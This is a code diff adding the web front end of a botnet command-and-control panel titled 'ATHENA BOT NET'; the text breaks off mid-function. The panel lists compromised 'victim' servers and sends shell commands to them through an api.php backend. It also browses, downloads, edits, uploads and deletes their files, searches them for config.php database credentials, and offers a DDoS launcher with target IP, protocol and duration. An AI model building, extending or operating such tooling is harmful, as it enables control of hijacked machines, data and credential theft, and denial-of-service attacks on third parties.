@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html ng-app="myApp" ng-controller="myCtrl">
+<meta charset="utf-8">
+<head>
+	<title>ATHENA BOT NET  </title>
+	
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script>	
+	<script type="text/javascript" src="https://angular-file-upload.appspot.com/js/ng-file-upload-shim.js"></script>
+	<script type="text/javascript" src="https://angular-file-upload.appspot.com/js/ng-file-upload.js"></script>
+	<script type="text/javascript" src="js/saveAs.js"></script>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
+	<link href='https://fonts.googleapis.com/css?family=PT+Sans' rel='stylesheet' type='text/css'>
+	<script type="text/javascript" src="required/prism.js"></script>
+	<link href='required/prism.css' rel='stylesheet' type='text/css'>
+	
+	<style type="text/css">
+		body{
+			font-family: 'PT Sans', sans-serif;
+			font-size: 14px;
+		}
+		.glyphicon-refresh-animate {
+			-animation: spin .7s infinite linear;
+			-ms-animation: spin .7s infinite linear;
+			-webkit-animation: spinw .7s infinite linear;
+			-moz-animation: spinm .7s infinite linear;
+		}
+
+		@keyframes spin {
+			from { transform: scale(1) rotate(0deg);}
+			to { transform: scale(1) rotate(360deg);}
+		}
+
+		@-webkit-keyframes spinw {
+			from { -webkit-transform: rotate(0deg);}
+			to { -webkit-transform: rotate(360deg);}
+		}
+
+		@-moz-keyframes spinm {
+			from { -moz-transform: rotate(0deg);}
+			to { -moz-transform: rotate(360deg);}
+		}
+		.scroll {
+
+			max-height: 50vh; /* %-height of the viewport */
+			overflow-y: scroll; 
+		}
+		.tableData{
+			font-size: 12px;
+			font-family: tahoma ;
+		}
+		.codearea{
+			background-color: #FFEDBA ; 
+			color: #363636 ; 
+			font-style: tahoma ; 
+			font-size: 12px; 
+			width: 100%;
+			padding: 10px;
+			border : 0 ;
+			border-left-style: solid;
+			border-left-width: 10px;
+			border-left-color: #916401;
+		}
+		.cmd{
+			width: 100%;
+			background-color: #292929;
+			color: #F2F2F2;
+			border-left-style: solid;
+			border-left-width: 10px;
+			border-left-color: #4B9403;
+			padding-left: 10px;
+			font-family: tahoma;
+			font-size: 12px;
+			padding: 6px;
+			margin-bottom: 3px;
+		}
+		.textcmd{
+			font-family: tahoma ;
+			font-size: 12px;
+		}
+		div.browse-wrap {
+			top:0;
+			left:0;
+			margin:20px;
+			cursor:pointer;
+			overflow:hidden;
+			padding:20px 60px;
+			text-align:center;
+			position:relative;
+			background-color:#f6f7f8;
+			border:solid 1px #d2d2d7;}
+			div.title {
+				color:#3b5998;
+				font-size:14px;
+				font-weight:bold;
+				font-family:tahoma, arial, sans-serif;}
+				input.upload {
+					right:0;
+					margin:0;
+					bottom:0;
+					padding:0;
+					opacity:0;
+					height:300px;
+					outline:none;
+					cursor:inherit;
+					position:absolute;
+					font-size:1000px !important;}
+					span.upload-path {
+						text-align: center;
+						margin:20px;
+						display:block;
+						font-size: 80%;
+						color:#3b5998;
+						font-weight:bold;
+						font-family:tahoma, arial, sans-serif;
+
+					}
+				</style>
+			</head>
+			<body  style="background-image:url('images/back1.jpg');background-size:cover; background-repeat: no-repeat;width:100%;height:100%; background-color:  #121212; color: #F2F2F2;">
+				<div >
+					<div class="row">
+						<div class="col-md-{{login}} col-md-offset-{{login1}}">
+							<div style="position: relative;top: 50px;">
+								<div class="panel panel-default" style="opacity: 0.9;">
+									<div class="panel-body" style=" opacity: 1;">
+
+
+										<div ng-show="vict.length ">
+											<div  style="display: block;">
+												<button type="button" class="btn btn-default " style="margin : 5px;padding: 3px;padding-right: 5px;padding-left: 5px;color: #313233" ng-click="refreshBot()"><i class="glyphicon glyphicon-retweet"></i></button>
+
+												<button type="button" class="btn btn-default " style="margin : 5px; padding: 3px;padding-right: 5px;padding-left: 5px;color: #313233 ; font-family : tahoma; font-size : 12px;" ng-click="crypteShow()"><i class="glyphicon glyphicon-barcode" ></i> &nbsp; CRYPTE / HIDE </button>
+
+												<button type="button" class="btn btn-default " style="margin : 5px; padding: 3px;padding-right: 5px;padding-left: 5px;color: #313233 ; font-family : tahoma; font-size : 12px;" ng-click="crypteShow()"><i class="glyphicon glyphicon-scale" ></i> &nbsp; DDOS </button>
+
+												<button type="button" class="btn btn-default " ng-click="torrentShow()"  style="margin : 5px; padding: 3px;padding-right: 5px;padding-left: 5px;color: #313233 ; font-family : tahoma; font-size : 12px;" ><img src="images/torrent.png" style="max-height : 15px;"> &nbsp; Host File / Torrent ( Crypte )  </button>
+												<button type="button" class="btn btn-default " ng-click="torrentDowShow()"  style="margin : 5px; padding: 3px;padding-right: 5px;padding-left: 5px;color: #313233 ; font-family : tahoma; font-size : 12px;" ><img src="images/torrent.png" style="max-height : 15px;"> &nbsp; Download File / Torrent ( Decrypte )  </button>
+											</div>
+											 
+											 <div ng-show="torrentDownStatus" style="display: block;color : black;" class="well well-sm">
+											 	<form name="myForm4">
+											 	<input type="text" class="form-control" style="font-size :12px;" ng-model="masterkey" placeholder="MASTER KEY (OPTIONAL) IF EXICT " />
+
+											 	<span type="file"  ngf-select ng-model="picFile" name="file" required ngf-model-invalid="errorFile" class="btn btn-primary btn-file" style="width: 100% !important; ">
+												  	file (.key) &nbsp;<i class="glyphicon glyphicon-level-up"></i>
+												  </span></br></br>
+												  <button ng-disabled="!myForm4.$valid" 
+											ng-click="uploadTorDown(picFile)" class="btn btn-success" style="width : 100%;">Submit</button>
+											 	</form>
+											 </div>
+											<div ng-show="torrentStatus" style="display: block;color : black;" class="well well-sm">
+												<form name="myForm3">
+												</br>
+												<img src="images/key.png" style="max-height : 20px;display : inline-block;">
+												<input type="text" class="form-control" style="width : 60%; display : inline-block;font-size :12px;" ng-model="masterkey" placeholder="MASTER KEY (OPTIONAL) NEEDED FOR DECRYPTE ">
+												
+												<input type="text" class="form-control pull-right" style="width : 20%;font-size : 12px; display : inline-block;" ng-model="buffer" placeholder="BUFFER  DEFAULT 1000 ">
+												<img src="images/buffer.png"  class="pull-right" style="max-height : 20px;display : inline-block;">
+												</br></br>
+												 <span type="file"  ngf-select ng-model="picFile" name="file" required ngf-model-invalid="errorFile" class="btn btn-primary btn-file" style="width: 100% !important; ">
+												  	Add file &nbsp;<i class="glyphicon glyphicon-level-up"></i>
+												  </span></br></br>
+												  <button ng-disabled="!myForm3.$valid" 
+											ng-click="uploadTor(picFile)" class="btn btn-success" style="width : 100%;">Submit</button>
+												</form>
+
+											</div>
+											<div ng-show="crypteStatus" style="display: block;color : black;" class="well well-sm">
+											<form name="myForm1" novalidate=""></form>
+											</hr>
+											<h5>DDOS Interface :</h5>
+											<div class="form-group">
+												
+
+												<input type="text" class="form-control" style="display : inline-block; width : 30%;"  ng-model="pathimg" placeholder="IP:port Default (80)">
+
+												<input type="text" class="form-control" style="display : inline-block; width : 10%;"  ng-model="pathimg" placeholder=" DDos Time (ms) ">
+
+												<select class="form-control" style="display : inline-block; width : 10%;"  ng-model="pathimg">
+													  <option>UDP</option>
+													  <option>TCP</option>
+													 
+													</select>
+
+												<button type="button" style="display : inline-block; width : 15%;" class="btn btn-primary push-right">Start DDOS </button>
+
+
+											</div>
+											
+										</div>
+										<div >
+											<table class="table table-striped" style="font-weight: lighter;color: #313233;">
+												<thead>
+													<tr>
+														<th></th>
+														<th><img src="images/map.png" style="max-height: 18px;"></th>
+														<th><img src="images/domaine.png" style="max-height: 18px;margin: auto;"></th>
+														<th><img src="images/ip.png" style="max-height: 18px !important;"></th>
+														<th>OS</th>
+														<th>PHP </th>
+														<th>Pyhton </th>
+														<th>Kernel</th>
+														<th>Socket </th>
+														<th>cmd</th>
+														<th>Actions </th>
+
+													</tr>
+												</thead>
+												<tbody class="tableData">
+
+													<tr ng-repeat="victime in vict">
+														<td><div class="checkbox"></div></td>
+														<td><img ng-src="https://www.iplocation.net//assets/images/flags/{{victime.cn}}.gif"></td>
+														<td>{{victime.domaine}}</td>
+														<td>{{victime.ip}}</td>
+														<td>{{victime.os}}</td>
+														<td>{{victime.php}}</td>
+														<td>
+															<img ng-src="images/{{victime.python}}.png"  style="max-height: 12px !important;" />
+														</td>
+														<td>{{victime.kernel}}</td>
+														<td>
+															<img ng-src="images/{{victime.socket}}.png" style="max-height: 12px !important;" />
+														</td>
+
+														<td><img ng-src="images/{{victime.cmd}}.png" style="max-height: 12px !important;" /></td>
+
+														<td>
+															<i class="glyphicon glyphicon-folder-open" ng-click="getFiles(victime.id)" style="margin-left: 5px;color: #EDA807;cursor: pointer;"  > </i>
+
+															<i class="glyphicon glyphicon-refresh" ng-click="changeBotLink(victime.id)" style="margin-left: 5px;color: #047FB0;cursor: pointer;"></i>
+															<img ng-src="images/db.png" ng-click="showDbForm()" style="max-height: 15px !important;cursor: pointer;" />
+
+															<img src="images/term.png" style="cursor: pointer; max-height : 16px !important;" ng-show="victime.cmd" ng-click="cmd(victime.id)"  />
+															<i class="glyphicon glyphicon-trash" ng-click="deleteBot(victime.id , $index )"style="margin-left: 5px;color: #AB0314;cursor: pointer;"></i>
+														</td>
+													</tr>
+
+												</tbody>
+											</table>
+										</hr>
+										<div ng-show="dbForm" style="color: black;font-size: 8px;">
+											<div class="well well-sm">
+												<center>
+													<button type="button" class="btn btn-success" style="margin-right: 15px;font-size : 12px;">Search Config.php (FAST )</button>
+													<button type="button" class="btn btn-default" style="margin-right: 15px;font-size : 12px;">  Search Pattern (*conf*.php )</button>
+													<button type="button" class="btn btn-warning " style="margin-right: 15px;font-size : 12px;"> Search *.php ( SLOW )</button>
+												</center>
+											</div>
+											<form class="form-inline" ng-hide="true">
+												<div class="form-group">
+													<label for="exampleInputName2" style="font-family: tahoma;font-weight: lighter;font-size: 12px;">HOST</label>
+													<input type="text" class="form-control"  placeholder="localhost">
+												</div>
+												<div class="form-group">
+													<label for="exampleInputEmail2" style="font-family: tahoma;font-weight: lighter;font-size: 12px;">USERNAME</label>
+													<input type="text" class="form-control"  placeholder="XXXXXX">
+												</div>
+												<div class="form-group">
+													<label for="exampleInputEmail2" style="font-family: tahoma;font-weight: lighter;font-size: 12px;">PASSWORD</label>
+													<input type="password" class="form-control"  placeholder="XXXX">
+												</div>
+												<button type="submit" class="btn btn-success pull-right" style="font-size: 10px;">CONNECT &nbsp; <i class="glyphicon glyphicon-console"></i></button>
+
+											</form>
+										</div>
+										<div ng-show="cmdstat">
+											<span ng-show="timeElapsed" style="color: #303030;font-family: tahoma ; font-size: 12px;">
+												<img src="images/loading.gif" style="max-height: 25px !important;" ng-show="cmdExu">	Last Commande Execution Time  : {{timeElapsed}}
+											</span>
+											<button type="button" class="btn btn-default pull-right" style="padding: 1px;padding-right: 3px;padding-left: 3px;" ng-click="hideCmd()">
+												<i class="glyphicon glyphicon-remove-sign " style="color:#3E3F40;font-size: 15px;"  ></i>
+											</button>
+
+										</hr>
+										<div class="cmd scroll" ng-repeat="cm in cmds" ng-style="cm.type==1 && {'border-left-color':'#048DBA'}">
+											<div ng-bind-html="cm.body | unsafe"></div>
+										</div>
+
+										<textarea class="form-control textcmd" rows="3" ng-model="cmdText"  ng-disabled="cmdExu" style="width: 100%;margin: 5px;"></textarea>
+										<button type="button" class="btn btn-primary" style="width: 100%;" ng-disabled="cmdExu" ng-click="sendCmd()">Send CMD</button>
+
+									</div>
+									<div class="btn btn-primary" style="width: 100%;height: 1px;max-height: 1px !important;"> </div>
+									<div style="color: black;" ng-show="currentVict">
+									</hr>
+									<button type="button" class="btn btn-danger btn-sm pull-right" ng-click="hideFiles()"><i class="glyphicon glyphicon-remove-circle"></i></button>
+								</hr>
+								<hr/>
+
+							</div>
+							<div ng-show="displimg && fileshow">
+								<button type="button" class="btn btn-default btn-sm" ng-click="exitFile()"><i class="glyphicon glyphicon-arrow-left"></i></button>
+								<div>			
+									<center>
+										<img src="data:image/png;base64, {{fileshow}}" alt="Red dot" style="max-width: 100% !important;" />
+									</center>
+								</div>
+							</div>
+							<div  ng-show="fileshow && (displimg == false ) " >
+								<div style="display: block;">
+									<button type="button" class="btn btn-default btn-sm" ng-click="exitFile()"><i class="glyphicon glyphicon-arrow-left"></i></button>
+									<span  style="color: #575757;font-size: 12px;">{{currentVict.name}}/<span style="color: red;font-size: 12px;">{{filename}}	</span></span>
+								</div>
+								<pre nag-prism source="{{fileshow}}" class="language-php scroll" style="font-size: 12px;display: block;" ng-hide="edit">
+
+								</pre >
+								<textarea class="codearea scroll" rows="20" ng-model="filedit" ng-show="edit"  ng-disabled="change" ></textarea>
+
+								<button type="button" class="btn btn-default btn-sm pull-right" style="font-style: 'tahoma' ;font-size: 12px;margin: 4px;" ng-click="editFile()" ng-hide="edit" ng-show="editRight" >Edit </button>
+
+								<button type="button" class="btn btn-default btn-sm pull-right" style="font-style: 'tahoma' ;font-size: 12px;margin: 4px;" ng-click="cancellEdit()" ng-show="edit"  ng-disabled="change" >Cancell edit </button>
+
+								<button type="button" class="btn btn-success btn-sm pull-right" style="font-style: 'tahoma' ;font-size: 12px;margin: 4px;" ng-click="saveChange()" ng-show="edit"   ng-disabled="change">Save  </button>
+
+								<button type="button" class="btn btn-danger btn-sm pull-right"  ng-hide="edit"  ng-show="editRight" style="font-style: 'tahoma' ;font-size: 12px;margin: 4px;">  <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>Delete </button>
+
+
+							</div>
+
+							<div  ng-show="currentVict" >
+								<div ng-hide="fileshow">
+									<hr style="padding: 3px;margin: 3px;">
+
+									<span style="color : #1B1C1C" class="">
+										<span style="color: #0264A1;" ng-show="load"><i class="glyphicon glyphicon-repeat glyphicon-refresh-animate"></i></span>
+										<button type="button" class="btn btn-default btn-sm" ng-click="refresh()"><i class="glyphicon glyphicon-repeat"></i></button>
+										<button type="button" class="btn btn-default btn-sm" ng-click="goHome()"><i class="glyphicon glyphicon-home"></i></button>
+										<span class="label label-default">Current Path</span> {{currentVict.name}}
+
+										<form class="form-inline pull-right " style="display: inline-block;">
+
+											<div class="form-group"  >
+												<input type="text" class="form-control" placeholder="Search" ng-model="searchText" style="display: inline-block;height: 30px;font-size: 12px;padding: 3px;">
+												<i class="glyphicon glyphicon-search " style="color : #1B1C1C;" ></i>
+											</div>
+
+
+										</form>
+									</span>
+
+									<hr style="padding: 3px;margin: 3px;">
+
+									<div class="scroll">
+										<table class="table table-striped " style="font-weight: 200;color: #313233;font-size: 12px;padding: 2px;margin: 2px;background-color: #F0F0F0;">
+											<thead>
+												<tr>
+													<th><i class="glyphicon glyphicon-arrow-left" ng-click="goBackPath()" style="cursor: pointer;"></i></th>
+													<th>Type</th>
+													<th>Name</th>
+													<th>Size</th>
+													<th>Permission</th>
+													<th>Last Mdate</th>
+													<th>Action</th>
+
+												</tr>
+											</thead>
+											<tbody ng-disabled="true">
+												<div>
+													<tr ng-repeat="file in currentVict.files | filter:searchText | orderBy:['-type','-name.length']">
+														<td>
+															<div class="checkbox" style="padding: 0px;margin: 0px;">
+																<label>
+																	<input type="checkbox">
+																</label>
+															</div>
+														</td>
+														<td>
+															<img ng-src="images/{{fileExt(file.name ,file.type )}}" ng-click="changePath(file.name , file.type )" style="max-height: 24px !important;">
+														</td>
+														<td>{{file.name}}</td>
+														<td>{{file.size}}</td>
+														<td>{{file.perm}}</td>
+														<td>{{file.mtime}}</td>
+														<td>
+															<img src="images/unzip.png" style="cursor: pointer; max-height: 25px !important; " ng-show="getExt(file.name)==='zip'" ng-click="unzip(file.name)">
+															<img src="images/compress.png" ng-click="zip(file.name)"  style="cursor: pointer;" ng-show="file.type==1">
+															
+															<i class="glyphicon glyphicon-pencil"  style="cursor: pointer;" ng-show="file.type==0"></i>
+															<img src="images/down.png" style="cursor: pointer;max-height: 25px !important;" ng-click="download(file.name)"  ng-show="file.type==0">
+															<i class="glyphicon glyphicon-trash" style="cursor: pointer;" ng-click="deleteFile(file.name , file.type)"></i>
+														</td>
+													</tr>
+												</div>
+
+
+											</tbody>
+										</table>
+
+									</div>
+
+								</div>
+							</br>
+						</hr>
+					</br>
+				</hr>
+				<div style="opacity: 1; display: block;" class="panel panel-default">
+					<div class="panel-body" style="width: 100%;color: black;"> 
+						<div class="row">
+							<div class="col-md-6">
+								<form class="form-inline">
+									<div class="form-group">
+										<label ><span style="font-size: 12px;font-weight: lighter;">{{path}}</span></label>
+										<input type="text" class="form-control" ng-model="createdirname" style="height: 30px;font-size: 12px;" placeholder="Directory name">
+									</div>
+
+									<button type="submit" class="btn btn-primary btn-sm" ng-click="makeDir()">Make dir</button>
+								</form>
+							</div>
+							<div class="col-md-6">
+								<form class="form-inline">
+									<div class="form-group">
+										<label ><span style="font-size: 12px;font-weight: lighter;">{{path}}</span></label>
+										<input type="text" ng-model="createfilename"  class="form-control" style="height: 30px;font-size: 12px;" placeholder="File name">
+									</div>
+
+									<button type="submit" class="btn btn-success btn-sm" ng-click="makeFile()">Make File</button>
+
+
+								</form>
+								<form name="myForm">
+									<fieldset>
+										<div class="browse-wrap">
+											<div class="title">Choose a file to upload</div>
+											<input type="file"  class="upload" title="Choose a file to upload"  ngf-select ng-model="picFile" name="file" required ngf-model-invalid="errorFile">
+										</div>
+
+
+										<button ng-disabled="!myForm.$valid" 
+										ng-click="uploadPic(picFile)">Submit</button>
+										<span class="progress" ng-show="picFile.progress >= 0">
+											<div class="progress" ng-hide="picFile.progress==100">
+												<div class="progress-bar progress-bar-info progress-bar-striped" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width: {{picFile.progress}}%">
+													<span class="sr-only">{{picFile.progress}}% Complete</span>
+												</div>
+											</div>
+
+										</span>
+										<span ng-show="picFile.result">Upload Successful</span>
+										<span class="err" ng-show="errorMsg">
+											<div class="alert alert-danger" role="alert">Error : {{errorMsg}} </div>
+										</span>
+									</fieldset>
+									<br>
+								</form>
+
+							</div>
+						</div>
+					</div>
+
+				</div>
+
+
+			</div>
+		</div>
+	</div>	
+	<form novalidate name="formlogin" ng-hide="vict">
+		<div class="alert alert-danger" style="padding: 5px;text-align: center;" ng-show="error.length > 0"><i class="glyphicon glyphicon-exclamation-sign"></i> &nbsp;{{error}}</div>
+		<div class="form-group has-feedback">
+
+			<input type="texte" style="font-size : 12px;" class="form-control" ng-model="key" name="key" ng-disabled="send" name="username" placeholder="AEC CRYPTE KEY  (32 Lenght) " ng-maxlength="32" ng-minlength="32"    maxlength="32" required=""/>
+			<i class="glyphicon glyphicon-lock form-control-feedback" style="color: #00698C;"></i>
+		</div>
+
+		<span type="file"  ngf-select ng-model="picFile" name="file" required ngf-model-invalid="errorFile" class="btn btn-warning btn-file" style="margin-bottom : 10px;width: 100% !important; ">
+												  	Uploud Encrypted Private Key  &nbsp;<i class="glyphicon glyphicon-level-up"></i>
+		</span>
+		
+		<button class="btn btn-primary" ng-disabled="!formlogin.$valid"  style="width : 100%;" type="button" ng-click="sendLogin(picFile)">
+			<span class="pull-right"><i class="glyphicon glyphicon-repeat glyphicon-refresh-animate" ng-show="send"></i>
+				<i class="glyphicon glyphicon-ice-lolly-tasted" ng-hide="send"></i></span> Submit
+			</button>
+		</form>
+	</div>
+
+</div>
+
+</div>
+
+</div>
+</div>
+</div>
+
+<script>
+	var app = angular.module('myApp', ['ngFileUpload']);
+	var  apiLink = "api.php" ;
+	app.filter('unsafe', function($sce) { return $sce.trustAsHtml; });
+	app.controller('myCtrl', function($scope , $http , Upload, $timeout) {
+		$scope.send = false ;
+		$scope.key = "" ;
+		$scope.username = "";
+		$scope.password = "";
+		$scope.createfilename = "";
+		$scope.createdirname = "";
+		$scope.dbForm = false;
+		$scope.login = 4 ;
+		$scope.login1 = 4 ;
+		$scope.load = false ;
+		$scope.cmdText = "";
+		$scope.cmds = [];
+		$scope.fileshow = false;
+		$scope.crypteStatus = false ;
+		$scope.torrentStatus = false ;
+		$scope.torrentDownStatus = false ;
+		$scope.pathimg = "";
+		$scope.buffer = '';
+		$scope.masterkey = "";
+		$scope.torrentDowShow = function(){
+			if($scope.torrentDownStatus==true){
+				$scope.torrentDownStatus = false ;
+			}else{
+				$scope.torrentDownStatus=true;
+			}
+		}
+		$scope.torrentShow = function(){
+			if($scope.torrentStatus==true){
+				$scope.torrentStatus = false ;
+			}else{
+				$scope.torrentStatus=true;
+			}
+
+		}
+		$scope.getExt = function (fileName) {
+
+			return fileName.split('.').pop();
+
+		}
+		$scope.crypteShow = function(){
+			console.log($scope.crypteStatus);
+			if($scope.crypteStatus== true){
+				$scope.crypteStatus = false ;
+			}
+			else {
+				$scope.crypteStatus = true ;
+			}
+		}
+		$scope.fileExt = function (fileName , type){
+			if(type == 1) return 'folder.png' ;
+			var ext = fileName.split('.').pop();
+			if(ext === 'php'){
+				return 'php.png' ;
+			}
+			else if(ext === 'txt'){
+				return 'txt.png' ;
+			}
+			else if(ext === 'jpg' ||  ext === 'png'  || ext === 'gif' ){
+				return 'img.png' ;
+			}
+			else if(ext === 'rar' ||  ext === 'zip'  ){
+				return 'zip.png' ;
+			}
+			else if(ext === 'html'){
+				return 'html.png' ;
+			}
+			else if(ext === 'css'){
+				return 'css.png' ;
+			}
+			else if(ext === 'log'){
+				return 'log.png' ;
+			}
+			else if(ext === 'js'){
+				return 'js.png' ;
+			}
+			else {
+				return 'un.png';
+			}
+		}
+
+		$scope.uploadTor = function(file) {
+			var link = apiLink+"?action=torFile&key="+$scope.masterkey+"&buffer="+$scope.buffer;
+			file.upload = Upload.upload({
+				url: link ,
+				data: {file: file},
+			});
+
+			file.upload.then(function (response) {
+				$timeout(function () {
+					
+					if(response.data.status==true){
+						var blob = new Blob([response.data.data.data], {type: "text/plain;charset=utf-8"});
+						saveAs(blob, response.data.data.name);
+					}
+
+					
+				});
+			}, function (response) {
+				if (response.status > 0)
+					$scope.errorMsg = response.status + ': ' + response.data;
+			}, function (evt) {
+      // Math.min is to fix IE which reports 200% sometimes
+      file.progress = Math.min(100, parseInt(100.0 * evt.loaded / evt.total));
+  });
+		}
+		$scope.uploadTorDown = function(file) {
+			var link = apiLink+"?action=uploadTorDown&&key="+$scope.masterkey+"&&id=01";
+			file.upload = Upload.upload({
+				url: link ,
+				data: {file: file},
+			});
+
+			file.upload.then(function (response) {
+				$timeout(function () {
+						console.log(response.data);
+					if(response.data.status==true){
+						var blob = new Blob([response.data.data.code], {type: response.data.data.type});
+						saveAs(blob, response.data.data.name);
+					}
+					else{
+						alert('probleme');
+
+
+					}
+					
+
+					
+				});
+			}, function (response) {
+				if (response.status > 0)
+					$scope.errorMsg = response.status + ': ' + response.data;
+			}, function (evt) {
+      // Math.min is to fix IE which reports 200% sometimes
+      file.progress = Math.min(100, parseInt(100.0 * evt.loaded / evt.total));
+  });
+		}
+
+		$scope.uploadPic = function(file) {
+			var link = apiLink+"?action=uplodFile&id="+$scope.currentVictid+"&path="+$scope.path;
+			file.upload = Upload.upload({
+				url: link ,
+				data: {username: $scope.username, file: file},
+			});
+
+			file.upload.then(function (response) {
+				$timeout(function () {
+					file.result = response.data;
+					$scope.refresh();
+					
+				});
+			}, function (response) {
+				if (response.status > 0)
+					$scope.errorMsg = response.status + ': ' + response.data;
+			}, function (evt) {
+      // Math.min is to fix IE which reports 200% sometimes
+      file.progress = Math.min(100, parseInt(100.0 * evt.loaded / evt.total));
+  });
+		}
+		$scope.uploadFile = function(file) {
+			
+			var link = apiLink+"?action=crFile&path="+$scope.pathimg;
+			console.log($scope.pathimg);
+			file.upload = Upload.upload({
+				url: link ,
+				data: {username: $scope.username, file: file},
+			});
+
+			file.upload.then(function (response) {
+				$timeout(function () {
+							console.log(response.data);
+					});
+			}, function (response) {
+				if (response.status > 0)
+					$scope.errorMsg = response.status + ': ' + response.data;
+			}, function (evt) {
+      // Math.min is to fix IE which reports 200% sometimes
+      file.progress = Math.min(100, parseInt(100.0 * evt.loaded / evt.total));
+  });
+		}
+		$scope.cmd = function(id){
+			$scope.cmdid = id ;
+			$scope.cmdstat =  true ;
+		}
+		$scope.refreshBot = function(){
+			
+			$http.post(apiLink , { action: "refreshBots" }).success(function(data) {
+				
+				$scope.vict = data.data;
+			})
+
+		}
+		$scope.hideCmd = function(){
+			$scope.cmdstat =  false ;
+
+		}
+		$scope.zip = function (name){
+			$scope.load = true ;
+			var path = $scope.path+'/'+name;
+			$http.post(apiLink , { action: "zip" , id  : $scope.currentVictid , path : path , name : name}).success(function(data) {
+				$scope.load = false ;
+				console.log(data);
+				$scope.refresh();
+			})
+		}
+		$scope.download = function(name){
+				var path = $scope.path +'/'+name;
+				$scope.load = true ;
+				$http.post(apiLink , { action: "download" , id  : $scope.currentVictid , path : path }).success(function(data) {
+
+					$scope.load = false ;
+					if(data.status==true){
+						var blob = new Blob([data.code], {type: data.type});
+						saveAs(blob, name);
+					}
+					else{
+
+					}
+
+				})	
+		}
+		$scope.unzip = function(name ){
+
+			if($scope.getExt(name)==='zip'){
+				$scope.load = true ;
+				$http.post(apiLink , { action: "unzip" , id  : $scope.currentVictid , path : $scope.path , name : name}).success(function(data) {
+					$scope.load = false ;
+					console.log(data);
+					$scope.refresh();
+
+				})
+				
+
+			}else{
+				return false ;
+			}
+		}
+		$scope.getFiles = function(id){
+
+			$scope.newPath = false;
+			$scope.load = true ;
+			$scope.fileshow = false ;
+			$scope.filename = false ;
+			$scope.currentVictid = id ;
+			$http.post(apiLink , { action: "getFiles" , id : id   , type : 1}).success(function(data) {
+				$scope.currentVict = data.data;
+				$scope.load = false ;
+				$scope.path= data.data.name;
+
+			})
+
+		}
+		$scope.exitFile = function(){
+
+			$scope.fileshow = false ;
+			$scope.filename = false ;
+			$scope.fileedit = false ;
+			$scope.displimg = false;
+		}
+		$scope.showDbForm = function(){
+			$scope.dbForm = true ;
+		}
+		$scope.refresh = function(){
+			$scope.load  = true ;
+			$http.post(apiLink , { action: "getFiles" , id : $scope.currentVictid , path : $scope.path , type : 1 }).success(function(data) {
+				if(data.status!= true){
+
+					return false ;
+				}
+
+				
+				$scope.path = data.data.name;
+				$scope.currentVict = data.data;
+
+				$scope.load = false ;
+
+
+			})
+		}
+		$scope.changePath =  function(name , type){
+			$scope.displimg = false;
+			var path = $scope.path+'/'+name;
+			$scope.load = true ;
+			$scope.fileshow = false ;
+			$scope.filename = false ;
+			$http.post(apiLink , { action: "getFiles" , id : $scope.currentVictid , path : path , type : type }).success(function(data) {
+				if(data.status!= true){
+
+					return false ;
+				}
+
+				if(type==1){
+					$scope.path = data.data.name;
+					$scope.currentVict = data.data;
+				}
+				else {
+
+					$scope.fileshow = data.data ;
+					$scope.ext = name.split('.').pop();
+					$scope.filename = name;
+					$scope.editRight = data.write;
+
+					if($scope.fileshow.length==0){
+						$scope.editFile();
+						$scope.fileshow = true;
+					}
+					if(data.img == true){
+						$scope.displimg = true ;
+					}
+
+
+				}
+
+				$scope.load = false ;
+
+
+			})
+
+		}
+		$scope.changeBotLink = function(id){
+
+			$http.post(apiLink , { action: "changeBotlink" , id : id }).success(function(data) {
+				$scope.change = false;
+				console.log(data);
+				return false;
+				if(data.status==true){
+					$scope.fileshow = $scope.filedit  ;
+					$scope.cancellEdit();
+
+				}
+				else {
+
+				}
+
+
+
+			})
+
+		}
+		$scope.deleteBot = function(id , index){
+			if (confirm('Are you sure you want to delete the bot with ID :'+id)) { 
+				
+				$scope.load = true ;
+				
+				var path = $scope.path+"/"+name; 
+				$http.post(apiLink , { action: "deleteBot" , id : id }).success(function(data) {
+					if(data.status == true ){
+						$scope.vict.split(index , 1);
+
+					}
+					
+
+				})
+			}
+		}
+		$scope.deleteFile= function(name , type){
+			if(type == 1){
+				var ty = "Directory";
+			}
+			else {
+				var ty = " File";
+			}
+			var message = "Confirmation Needed To delete  "+ty+"  nammed : " + name ;
+			if (confirm(message)) { 
+				$scope.load = true ;
+				var path = $scope.path+"/"+name; 
+				$http.post(apiLink , { action: "deleteFile" , id : $scope.currentVictid  , path : path  , type : type  }).success(function(data) {
+					console.log(data);
+					$scope.refresh();
+
+				})
+			}
+		}
+
+		$scope.goHome = function(){
+			$scope.getFiles($scope.currentVictid);
+		}
+		$scope.editFile = function(){
+			$scope.edit = true ;
+			$scope.filedit = $scope.fileshow;
+		}
+		$scope.cancellEdit = function(){
+			$scope.edit = false ;
+
+		}
+		$scope.saveChange = function(){
+			$scope.change = true ;
+			var path = $scope.path+"/"+$scope.filename;
+			$http.post(apiLink , { action: "editFile" , id : $scope.currentVictid  , path : path , contenu : $scope.filedit  }).success(function(data) {
+				$scope.change = false;
+				console.log(data);
+				if(data.status==true){
+					$scope.fileshow = $scope.filedit  ;
+					$scope.cancellEdit();
+
+				}
+				else {
+
+				}
+
+
+
+			})
+
+		}
+		$scope.goBackPath = function(){
+			var path = $scope.path+'/../';
+			$scope.load = true ;
+			$http.post(apiLink , { action: "getFiles" , id : $scope.currentVictid  , path : path  }).success(function(data) {
+
+				$scope.currentVict = data.data;
+				$scope.path =data.data.name;
+				$scope.load = false ;
+
+
+			})
+
+		}
+		$scope.sendCmd = function(){
+
+			$scope.cmdExu = true ;
+
+			if($scope.cmdText ==="clear"){
+				$scope.cmds = [];
+				$scope.cmdExu = false ;
+				$scope.cmdText = "";
+				return false ;
+
+			}
+			var start = new Date().getTime();
+			var cmds = {};
+			cmds.type = 1 ;
+			cmds.body = $scope.cmdText.replace(/\r?\n/g, '<br />');
+			$scope.cmds.push(cmds);
+
+			$http.post(apiLink , { action: "doCmd" , id : $scope.cmdid, cmd : $scope.cmdText }).success(function(data) {
+				var cmds = {};
+				cmds.type = 0 ;
+				cmds.body = data.data.replace(/\r?\n/g, '<br />');
+				$scope.cmds.push(cmds);
+				$scope.cmdText = "";
+				var end = new Date().getTime();
